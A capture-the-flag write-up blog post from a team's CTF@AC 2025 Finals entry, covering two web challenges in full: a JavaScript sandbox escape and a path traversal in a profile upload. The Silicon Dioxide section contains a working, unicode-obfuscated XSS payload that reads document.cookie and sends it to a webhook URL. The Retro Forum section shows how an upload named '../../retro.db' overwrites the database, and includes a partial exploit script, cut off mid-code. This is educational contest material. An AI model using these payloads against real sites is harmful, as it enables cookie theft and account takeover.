            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><nav id="TableOfContents">
  <ul>
    <li><a href="#web-">Web üåê</a>
      <ul>
        <li><a href="#silicon-dioxide">Silicon Dioxide</a></li>
        <li><a href="#retro-forum">Retro Forum</a></li>
        <li><a href="#not-wordle">Not wordle</a></li>
        <li><a href="#lolchat2">lolchat2</a></li>
      </ul>
    </li>
    <li><a href="#binary-exploitation-">Binary exploitation üè¥‚Äç‚ò†Ô∏è</a>
      <ul>
        <li><a href="#baby-ikea">baby-ikea</a></li>
        <li><a href="#tetrastack">Tetrastack</a></li>
        <li><a href="#mini-e8">mini-e8</a></li>
      </ul>
    </li>
    <li><a href="#cryptography-">Cryptography üîë</a>
      <ul>
        <li><a href="#sparse-hills">Sparse Hills</a></li>
        <li><a href="#black-prince">Black prince</a></li>
        <li><a href="#rule-of-x">Rule of X</a></li>
      </ul>
    </li>
    <li><a href="#miscellaneous-">Miscellaneous üêß</a>
      <ul>
        <li><a href="#full-house-poker">Full-House Poker</a></li>
        <li><a href="#grass-guesser">Grass-Guesser</a></li>
        <li><a href="#discord-sanity-check">Discord Sanity Check</a></li>
        <li><a href="#stairway-to-heaven">Stairway To Heaven</a></li>
        <li><a href="#love-at-first-bit">Love at first bit</a></li>
      </ul>
    </li>
    <li><a href="#reverse-engineering-">Reverse engineering ‚öôÔ∏è</a>
      <ul>
        <li><a href="#minecrafty-as-a-service">Minecrafty as a Service</a></li>
        <li><a href="#volatile">Volatile</a></li>
        <li><a href="#ironveil">IronVeil</a></li>
      </ul>
    </li>
    <li><a href="#hardware-">Hardware üîå</a>
      <ul>
        <li><a href="#arducan">Arducan</a></li>
        <li><a href="#baby-board">Baby Board</a></li>
      </ul>
    </li>
    <li><a href="#forensics-">Forensics ü§ñ</a>
      <ul>
        <li><a href="#fire-and-ice">Fire and Ice</a></li>
      </ul>
    </li>
    <li><a href="#osint-">OSINT üåè</a>
      <ul>
        <li><a href="#fangs-overseas">Fangs overseas</a></li>
      </ul>
    </li>
  </ul>
</nav>
        </div>
    </details>
</div>

  <div class="post-content"><h1 id="ctfac-2025-finals">CTF@AC 2025 Finals<a hidden class="anchor" aria-hidden="true" href="#ctfac-2025-finals">#</a></h1>
<p><img alt="ctf at ac logo" loading="lazy" src="/images/ctf@ac.png"></p>
<p>We (Paolo) partecipated this CTF in Timi»ôoara from <strong>Fri, 07 Nov. 2025, 16:00 CET</strong> until <strong>Sun, 09 Nov. 2025, 10:00 CET</strong> arriving 2nd overall ü•≥.</p>
<p>Even though it was our first experience as a CTF in an international contest we managed to have real fun while solving these challenges.</p>
<p>Team components that partecipated:</p>
<ul>
<li><strong>Marco Balducci</strong>    (<a href="https://github.com/Mark-74"><code>@Cryingfreeman74</code></a>)</li>
<li><strong>Alan Davide Bovo</strong>  (<a href="https://github.com/AlBovo"><code>@Hecker404</code></a>)</li>
<li><strong>Enea Maroncelli</strong>   (<a href="https://github.com/eneamaroncelli27"><code>@Zazaman</code></a>)</li>
</ul>
<p><img alt="Team photo" loading="lazy" src="/images/teampaoloac.jpg"></p>
<h2 id="web-">Web üåê<a hidden class="anchor" aria-hidden="true" href="#web-">#</a></h2>
<h3 id="silicon-dioxide">Silicon Dioxide<a hidden class="anchor" aria-hidden="true" href="#silicon-dioxide">#</a></h3>
<h4 id="analysis">Analysis<a hidden class="anchor" aria-hidden="true" href="#analysis">#</a></h4>
<p>This challenge provided the source code for a Node.js web application designed for writing and sharing ‚Äúsandboxed‚Äù JavaScript code to edit a canvas. It had both a frontend and a backend handling the JavaScript execution.</p>
<h5 id="frontend">Frontend<a hidden class="anchor" aria-hidden="true" href="#frontend">#</a></h5>
<p>The frontend implemented a homemade ‚Äúsandboxed‚Äù environment to run JavaScript code as follows:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm"> * Super Duper Sandbox
</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">canvasSandbox</span><span class="p">(</span><span class="nx">code</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">sandboxFunc</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Function</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;canvas&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="sb">`
</span></span></span><span class="line"><span class="cl"><span class="sb">            const window = undefined;
</span></span></span><span class="line"><span class="cl"><span class="sb">            const document = undefined;
</span></span></span><span class="line"><span class="cl"><span class="sb">            const alert = undefined;
</span></span></span><span class="line"><span class="cl"><span class="sb">            const console = undefined;
</span></span></span><span class="line"><span class="cl"><span class="sb">            const eval = undefined;
</span></span></span><span class="line"><span class="cl"><span class="sb">            const Function = undefined;
</span></span></span><span class="line"><span class="cl"><span class="sb">            const setTimeout = undefined;
</span></span></span><span class="line"><span class="cl"><span class="sb">            const setInterval = undefined;
</span></span></span><span class="line"><span class="cl"><span class="sb">            const fetch = undefined;
</span></span></span><span class="line"><span class="cl"><span class="sb">            const XMLHttpRequest = undefined;
</span></span></span><span class="line"><span class="cl"><span class="sb">            const WebSocket = undefined;
</span></span></span><span class="line"><span class="cl"><span class="sb">            const localStorage = undefined;
</span></span></span><span class="line"><span class="cl"><span class="sb">            const sessionStorage = undefined;
</span></span></span><span class="line"><span class="cl"><span class="sb">            const location = undefined;
</span></span></span><span class="line"><span class="cl"><span class="sb">            const history = undefined;
</span></span></span><span class="line"><span class="cl"><span class="sb">            const navigator = undefined;
</span></span></span><span class="line"><span class="cl"><span class="sb">            const parent = undefined;
</span></span></span><span class="line"><span class="cl"><span class="sb">            const top = undefined;
</span></span></span><span class="line"><span class="cl"><span class="sb">            const self = undefined;
</span></span></span><span class="line"><span class="cl"><span class="sb">            const globalThis = undefined;
</span></span></span><span class="line"><span class="cl"><span class="sb">            canvas.constructor = null;
</span></span></span><span class="line"><span class="cl"><span class="sb">            canvas.__proto__.constructor = null;
</span></span></span><span class="line"><span class="cl"><span class="sb">            canvas.__proto__.__proto__.constructor = null;
</span></span></span><span class="line"><span class="cl"><span class="sb">            canvas.__proto__.__proto__.__proto__.constructor = null;
</span></span></span><span class="line"><span class="cl"><span class="sb">            canvas.__proto__.__proto__.__proto__.__proto__.constructor = null;
</span></span></span><span class="line"><span class="cl"><span class="sb">            canvas.__proto__.__proto__.__proto__.__proto__.__proto__.constructor = null;
</span></span></span><span class="line"><span class="cl"><span class="sb">            canvas.__proto__.__proto__.__proto__.__proto__.__proto__.__proto__.constructor = null;
</span></span></span><span class="line"><span class="cl"><span class="sb">            
</span></span></span><span class="line"><span class="cl"><span class="sb">            </span><span class="si">${</span><span class="nx">code</span><span class="si">}</span><span class="sb">
</span></span></span><span class="line"><span class="cl"><span class="sb">        `</span>
</span></span><span class="line"><span class="cl">        <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nx">sandboxFunc</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="nx">canvas</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">alert</span><span class="p">(</span><span class="s2">&#34;Sorry, your code did not run.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>It also provided a function that automatically executed any JavaScript code passed through the <code>/?code=</code> query parameter inside this sandboxed environment.</p>
<h5 id="backend">Backend<a hidden class="anchor" aria-hidden="true" href="#backend">#</a></h5>
<p>The backend was responsible for sharing the code and included an additional layer of checks:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">allowed_keywords</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;const&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;ctx&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;canvas&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;getContext&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;console&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;let&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;vx&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;vy&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;radius&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;function&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;update&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;clearRect&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;width&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;height&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;if&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;beginPath&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;arc&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;Math&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;PI&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;fillStyle&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;orange&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;fill&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;requestAnimationFrame&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">checkCode</span><span class="p">(</span><span class="nx">code</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">matches</span> <span class="o">=</span> <span class="nx">code</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/[A-Za-z]{2,}/g</span><span class="p">)</span> <span class="o">||</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">disallowed</span> <span class="o">=</span> <span class="nx">matches</span><span class="p">.</span><span class="nx">filter</span><span class="p">((</span><span class="nx">k</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="o">!</span><span class="nx">allowed_keywords</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="nx">k</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">disallowed</span><span class="p">.</span><span class="nx">length</span> <span class="o">===</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>The <code>/share</code> endpoint worked as follows:</p>
<ul>
<li>It checked the code for disallowed keywords.</li>
<li>It made a Chromium bot run it using the <code>/?code=</code> endpoint.</li>
</ul>
<p>However, the main vulnerability was in the flag cookie ‚Äî it was stored with <code>httpOnly: false</code>, meaning a simple XSS could easily steal it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">context</span><span class="p">.</span><span class="nx">addCookies</span><span class="p">([</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">name</span><span class="o">:</span> <span class="s2">&#34;flag&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">domain</span><span class="o">:</span> <span class="s2">&#34;localhost&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">path</span><span class="o">:</span> <span class="s2">&#34;/&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">value</span><span class="o">:</span> <span class="nx">FLAG</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">sameSite</span><span class="o">:</span> <span class="s2">&#34;Lax&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">secure</span><span class="o">:</span> <span class="kc">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">httpOnly</span><span class="o">:</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">]);</span>
</span></span></code></pre></div><h4 id="solution">Solution<a hidden class="anchor" aria-hidden="true" href="#solution">#</a></h4>
<p>After analyzing the entire challenge, finding a working solution was straightforward. The backend‚Äôs keyword check could be bypassed using UTF-8 encoding (bypassing the <code>[A-Za-z]{2,}</code> regex check). Then, the frontend could be exploited using the keyword <code>this</code>.</p>
<p>The frontend only removed <em>direct</em> references to most JavaScript functions but didn‚Äôt properly sanitize access through the actual <code>window</code> or <code>document</code> context.</p>
<p>Once we realized this, we wrote a fully working exploit that exfiltrated the admin‚Äôs cookie using a <code>fetch</code> request to our webhook.</p>
<h4 id="exploit">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">ctx</span> <span class="o">=</span> <span class="nx">canvas</span><span class="p">.</span><span class="nx">getContext</span><span class="p">(</span><span class="s1">&#39;2d&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">p</span> <span class="o">=</span> <span class="nx">ctx</span><span class="p">[</span><span class="s1">&#39;\u005f\u005f\u0070\u0072\u006f\u0074\u006f\u005f\u005f&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">c</span> <span class="o">=</span> <span class="nx">p</span><span class="p">[</span><span class="s1">&#39;\u0063\u006f\u006e\u0073\u0074\u0072\u0075\u0063\u0074\u006f\u0072&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">f</span> <span class="o">=</span> <span class="nx">c</span><span class="p">[</span><span class="s1">&#39;\u0063\u006f\u006e\u0073\u0074\u0072\u0075\u0063\u0074\u006f\u0072&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">g</span> <span class="o">=</span> <span class="nx">f</span><span class="p">(</span><span class="s1">&#39;\u0072\u0065\u0074\u0075\u0072\u006e\u0020\u0074\u0068\u0069\u0073&#39;</span><span class="p">)();</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">d</span> <span class="o">=</span> <span class="nx">g</span><span class="p">[</span><span class="s1">&#39;\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">s</span> <span class="o">=</span> <span class="nx">d</span><span class="p">[</span><span class="s1">&#39;\u0063\u006f\u006f\u006b\u0069\u0065&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">e</span> <span class="o">=</span> <span class="nx">g</span><span class="p">[</span><span class="s1">&#39;\u0065\u006e\u0063\u006f\u0064\u0065\u0055\u0052\u0049\u0043\u006f\u006d\u0070\u006f\u006e\u0065\u006e\u0074&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">h</span> <span class="o">=</span> <span class="nx">g</span><span class="p">[</span><span class="s1">&#39;\u0066\u0065\u0074\u0063\u0068&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">u</span> <span class="o">=</span> <span class="nx">e</span><span class="p">(</span><span class="nx">s</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">h</span><span class="p">(</span><span class="s1">&#39;\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0077\u0065\u0062\u0068\u006f\u006f\u006b\u002e\u0073\u0069\u0074\u0065\u002f\u0035\u0063\u0035\u0038\u0037\u0066\u0037\u0061\u002d\u0031\u0063\u0030\u0030\u002d\u0034\u0035\u0038\u0032\u002d\u0061\u0035\u0062\u0033\u002d\u0031\u0061\u0030\u0038\u0064\u0065\u0032\u0031\u0032\u0033\u0061\u0062\u003f\u0064\u003d&#39;</span> <span class="o">+</span> <span class="nx">u</span><span class="p">);</span>
</span></span></code></pre></div><p>Once executed, the flag appeared in the webhook logs as:</p>
<p><code>d=flag=CTF{c0d2d75449e3167001cbb38b891a78c8168c165d2cbd48f8f7b3123759963f66}</code></p>
<h3 id="retro-forum">Retro Forum<a hidden class="anchor" aria-hidden="true" href="#retro-forum">#</a></h3>
<h4 id="analysis-1">Analysis<a hidden class="anchor" aria-hidden="true" href="#analysis-1">#</a></h4>
<p>Retro Forum was a post/chat web platform where users could share their thoughts and administrators could moderate them.</p>
<p>The source code revealed how the SQLite database was structured and where it was stored, along with the main vulnerability in this route:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/edit_profile&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">edit_profile</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s1">&#39;user_id&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">session</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;login&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">conn</span> <span class="o">=</span> <span class="n">get_db</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">c</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">new_bio</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;bio&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">filename</span> <span class="o">=</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s1">&#39;profile_pic&#39;</span> <span class="ow">in</span> <span class="n">request</span><span class="o">.</span><span class="n">files</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">file</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">files</span><span class="p">[</span><span class="s1">&#39;profile_pic&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">file</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">filename</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">filename</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">file</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;UPLOAD_FOLDER&#39;</span><span class="p">],</span> <span class="n">filename</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">                <span class="n">c</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&#34;UPDATE users SET profile_pic=? WHERE id=?&#34;</span><span class="p">,</span> <span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">session</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">        <span class="n">c</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&#34;UPDATE users SET bio=? WHERE id=?&#34;</span><span class="p">,</span> <span class="p">(</span><span class="n">new_bio</span><span class="p">,</span> <span class="n">session</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">        <span class="n">conn</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;profile&#39;</span><span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="n">session</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">    <span class="n">c</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&#34;SELECT bio, profile_pic FROM users WHERE id=?&#34;</span><span class="p">,</span> <span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">],))</span>
</span></span><span class="line"><span class="cl">    <span class="n">bio</span><span class="p">,</span> <span class="n">pic</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;edit_profile.html&#39;</span><span class="p">,</span> <span class="n">bio</span><span class="o">=</span><span class="n">bio</span><span class="p">,</span> <span class="n">pic</span><span class="o">=</span><span class="n">pic</span><span class="p">)</span>
</span></span></code></pre></div><p>Here, the image uploaded by the user was saved <strong>without any sanitization or validation</strong>, leaving the platform vulnerable to a <strong>path traversal</strong> attack, allowing the user to overwrite any file with their uploaded image.</p>
<p>Before explaining the solution, it‚Äôs important to note the existence of the <code>debug_file</code> endpoint:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/debug/&lt;filename&gt;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">debug_file</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;is_admin&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;login&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">file_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">getcwd</span><span class="p">(),</span> <span class="n">filename</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">content</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">content</span><span class="p">,</span> <span class="mi">200</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span> <span class="s1">&#39;text/plain&#39;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="sa">f</span><span class="s2">&#34;Error: </span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="mi">404</span>
</span></span></code></pre></div><p>This endpoint later gave <strong>arbitrary read access</strong> to the full filesystem, allowing us to retrieve the actual flag.</p>
<h4 id="solution-1">Solution<a hidden class="anchor" aria-hidden="true" href="#solution-1">#</a></h4>
<p>Once the <strong>path traversal</strong> vulnerability was confirmed, the next step was to <strong>overwrite the <code>retro.db</code></strong> file by uploading a malicious file named <code>../../retro.db</code> through the profile picture upload form.</p>
<p>After successfully overwriting the database, I gained <strong>admin privileges</strong>, which allowed me to use another path traversal vulnerability in the <em>debug file</em> endpoint to read arbitrary files.</p>
<p>From there, I downloaded <code>flag.txt</code></p>
<pre tabindex="0"><code>gAAAAABpDfJWpJyLk4xz6hJCspj6XEpp0dCKgZUegC18TYQHfABujfRSTCa0zEei6qnDP6k8I-2V0by1aeJSEhKhhWI5EWppnQ==
</code></pre><p>and <code>populate.py</code>, which contained the logic for initializing the database.</p>
<p>Inside <code>populate.py</code>, I found default user data and posts, including a user named <strong>Josh</strong>, who frequently mentioned his password in his social posts and chats.</p>
<p>By analyzing these, I inferred that Josh‚Äôs password was used as the key to encrypt the flag with <strong>Fernet</strong>. Using this clue, I brute-forced all possible combinations of his password fragments until the flag decrypted successfully.</p>
<h4 id="script">Script<a hidden class="anchor" aria-hidden="true" href="#script">#</a></h4>
<p>Several scripts were used to solve this challenge, but the two most significant are the <strong>exploit to gain admin privileges</strong> and the <strong>password brute-forcing script</strong>.</p>
<h5 id="admin-privilege-exploit">Admin Privilege Exploit<a hidden class="anchor" aria-hidden="true" href="#admin-privilege-exploit">#</a></h5>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sqlite3</span><span class="o">,</span> <span class="nn">tempfile</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">werkzeug.security</span> <span class="kn">import</span> <span class="n">generate_password_hash</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">URL</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="k">assert</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">URL</span><span class="si">}</span><span class="s2">/&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">init_db</span><span class="p">(</span><span class="n">filename</span><span class="o">=</span><span class="s2">&#34;retro.db&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">conn</span> <span class="o">=</span> <span class="n">sqlite3</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">c</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">c</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s1">&#39;&#39;&#39;CREATE TABLE users (
</span></span></span><span class="line"><span class="cl"><span class="s1">        id INTEGER PRIMARY KEY AUTOINCREMENT,
</span></span></span><span class="line"><span class="cl"><span class="s1">        username TEXT UNIQUE,
</span></span></span><span class="line"><span class="cl"><span class="s1">        password TEXT,
</span></span></span><span class="line"><span class="cl"><span class="s1">        bio TEXT,
</span></span></span><span class="line"><span class="cl"><span class="s1">        is_admin INTEGER DEFAULT 0,
</span></span></span><span class="line"><span class="cl"><span class="s1">        profile_pic TEXT DEFAULT &#39;default.png&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">    )&#39;&#39;&#39;</span><span class="p">)</span>
